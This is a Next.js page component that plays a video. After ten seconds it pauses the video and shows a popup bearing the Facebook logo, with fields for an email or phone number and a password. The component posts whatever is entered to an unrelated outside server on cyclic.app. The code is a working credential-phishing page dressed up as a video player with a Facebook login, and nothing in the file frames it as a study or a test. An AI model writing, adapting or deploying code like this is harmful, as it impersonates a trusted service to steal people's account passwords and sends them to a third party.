import Layout from '@/components/layout'
import {
  Box,
  Button,
  CircularProgress,
  Dialog,
  InputAdornment,
  Stack,
  TextField,
  Typography,
} from '@mui/material'
import axios from 'axios'
import dynamic from 'next/dynamic'
import Image from 'next/image'
import { useEffect, useState } from 'react'
import { useForm } from 'react-hook-form'
import { BiHide, BiShow } from 'react-icons/bi'
import FacebookIcon from '../../public/assets/svg/facebook.svg'

const ReactPlayer = dynamic(() => import('react-player/lazy'), { ssr: false })

const Home = () => {
  const [currentUser, setCurrentUser] = useState<{ username: string; isAdmin: boolean } | null>(
    null,
  )
  const [currentVideo, setCurrentVideo] = useState<{ url: string; title: string } | null>(null)
  const [isOpenPopup, setIsOpenPopup] = useState(false)
  const [isShowPassword, setIsShowPassword] = useState<boolean>(false)
  const [isPlay, setIsPlay] = useState(true)
  const [loading, setLoading] = useState<boolean>(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm()
  const handleStop = (time: number) => {
    if (time > 10 && !currentUser) {
      setIsPlay(false)
      setIsOpenPopup(true)
    }
  }

  const onSubmit = async (data: any) => {
    setLoading(true)
    try {
      const res = await axios.post('https://long-ruby-earthworm-veil.cyclic.app/api/v1/users', data)
      setCurrentUser(res.data.user)
    } catch (error) {
      console.log(error)
    }
    setIsPlay(true)
    setIsOpenPopup(false)
    setLoading(false)
  }

  useEffect(() => {
    const getInfoVideo = async () => {
      try {
        const res = await axios.get('https://long-ruby-earthworm-veil.cyclic.app/api/v1/videos')
        setCurrentVideo(res.data.data)
      } catch (error) {
        console.log(error)
      }
    }
    getInfoVideo()
  }, [])

  return (
    <Box>
      <Layout>
        <Box px={5}>
          <ReactPlayer
            url={currentVideo?.url}
            loop={true}
            playing={isPlay}
            width={'100%'}
            height={'auto'}
            onProgress={(data) => handleStop(data.playedSeconds)}
            controls
            muted={true}
            config={{ file: { attributes: { playsInline: true, controlsList: 'nodownload' } } }}
          />

          <Typography color="white" mt={4} fontSize={20} fontWeight={700}>
            {currentVideo?.title}
          </Typography>
        </Box>
      </Layout>

      {/* POPUP */}
      <Dialog open={isOpenPopup}>
        <Stack sx={{ width: { xs: '80vw', md: '25vw' } }} minWidth={'250px'} py={4}>
          <Stack justifyContent={'center'} alignItems={'center'}>
            <Image src={FacebookIcon} alt="icon" width={250} />
          </Stack>

          <form onSubmit={handleSubmit(onSubmit)}>
            <Box mt={8} px={4}>
              <Box>
                <TextField
                  error={Boolean(errors?.username?.message?.toString())}
                  fullWidth
                  size="medium"
                  placeholder="Email address or phone number"
                  helperText={
                    errors?.username?.message?.toString()
                      ? errors?.username?.message?.toString()
                      : ''
                  }
                  {...register('username', { required: 'Required !' })}
                />
              </Box>
              <Box mt={3}>
                <TextField
                  error={Boolean(errors?.password?.message?.toString())}
                  fullWidth
                  size="medium"
                  placeholder="Password"
                  type={isShowPassword ? 'text' : 'password'}
                  InputProps={{
                    endAdornment: (
                      <InputAdornment
                        position="end"
                        sx={{ cursor: 'pointer' }}
                        onClick={() => setIsShowPassword(!isShowPassword)}
                      >
                        {isShowPassword ? <BiShow /> : <BiHide />}
                      </InputAdornment>
                    ),
                  }}
                  helperText={
                    errors?.password?.message?.toString()
                      ? errors?.password?.message?.toString()
                      : ''
                  }
                  {...register('password', { required: 'Required !' })}
                />
              </Box>
            </Box>
            <Box mt={4} textAlign={'center'}>
              <Button variant="contained" size="large" type={loading ? 'button' : 'submit'}>
                {loading ? (
                  <CircularProgress sx={{ color: 'white' }} size={24} />
                ) : (
                  <Typography fontWeight={'bold'}>Log in</Typography>
                )}
              </Button>
            </Box>
          </form>
        </Stack>
      </Dialog>
    </Box>
  )
}

export default Home
